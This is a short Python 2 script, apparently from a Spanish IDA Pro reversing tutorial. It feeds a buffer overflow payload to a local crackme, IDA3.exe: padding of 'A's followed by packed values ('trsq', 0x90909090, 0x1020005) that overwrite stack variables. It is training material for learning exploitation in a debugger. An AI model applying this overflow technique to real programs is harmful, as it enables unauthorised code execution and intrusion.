from subprocess import *
import struct
p = Popen([r'C:\Users\ricnar\Desktop\24-INTRODUCCION AL REVERSING CON IDA PRO DESDE CERO PARTE 24\IDA3.exe', 'f'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)

cookie="trsq"
cookie2=struct.pack("<L",0x1020005)
flag=struct.pack("<L",0x90909090)
string="Lo pude hacerrrr!!!!\n"

print "ATACHEA EL DEBUGGER Y APRETA ENTER\n"
raw_input()

primera=string + (68 -(len(string))) *"A"+ cookie + flag + cookie2
p.stdin.write(primera)

testresult = p.communicate()[0]

print primera
print(testresult)


